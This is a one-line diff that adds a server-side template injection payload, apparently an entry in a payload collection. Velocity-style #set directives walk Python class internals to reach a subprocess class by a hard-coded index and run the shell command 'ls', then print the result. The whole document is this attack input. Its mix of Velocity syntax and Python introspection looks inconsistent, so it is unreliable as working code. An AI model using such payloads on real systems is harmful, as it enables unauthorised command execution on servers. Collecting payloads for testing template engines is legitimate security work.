@@ -1,0 +1,1 @@
+#set($x='')\n#set($subclasses=$x.__class__.__mro__[1].__subclasses__())\n#set($popen=$subclasses[548])\n#set($cmd=$popen(['ls'], stdout=-1, shell=True))\n#set($output=$cmd.communicate()[0].decode('utf-8'))\n$output
